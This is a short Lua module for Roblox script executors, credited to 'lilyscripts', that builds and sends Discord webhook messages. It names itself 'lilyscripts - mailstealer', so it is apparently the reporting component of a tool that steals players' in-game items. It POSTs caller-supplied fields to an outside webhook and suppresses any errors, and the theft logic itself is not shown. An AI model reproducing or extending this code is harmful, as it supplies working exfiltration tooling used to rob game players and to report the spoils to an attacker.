--[[

made by lilyscripts
https://discord.gg/S4NHgEVmxy

]]

--// Variable Initialization
local httpService = game:GetService("HttpService")

--// Webhook Builder Function
local function webhookBuilder(webhook, title, description, fields)
    local self = {}

    self.webhook = webhook
    self.title = title
    self.description = description
    self.fields = fields

    -- Sends the payload to the webhook
    function self:send()
        pcall(function()
            request(
                {
                    Url = self.webhook,
                    Method = "POST",
                    Body = httpService:JSONEncode(
                        {
                            ["username"] = "lilyscripts - mailstealer",
                            ["avatar_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&",
                            ["embeds"] = {
                                {
                                    ["title"] = self.title,
                                    ["url"] = "https://discord.gg/S4NHgEVmxy",
                                    ["description"] = self.description,
                                    ["color"] = 0,
                                    ["fields"] = self.fields,
                                    ["footer"] = {
                                        ["text"] = "lilyscripts",
                                        ["icon_url"] = "https://media.discordapp.net/attachments/1031307376973856789/1213896280602841088/avatars-hZqwsYs0mAsTeKcK-PH8YWw-t500x500.jpg?ex=661c0e02&is=66099902&hm=2a02c86ceb38d710e5d0dc1cc9dcd6e454a64c10e2926a3fb6d6d08b5b2123c3&"
                                    }
                                }
                            }
                        }
                    ),
                    Headers = {
                        ["Content-Type"] = "application/json"
                    }
                }
            )
        end)
    end
    return self
end

return webhookBuilder
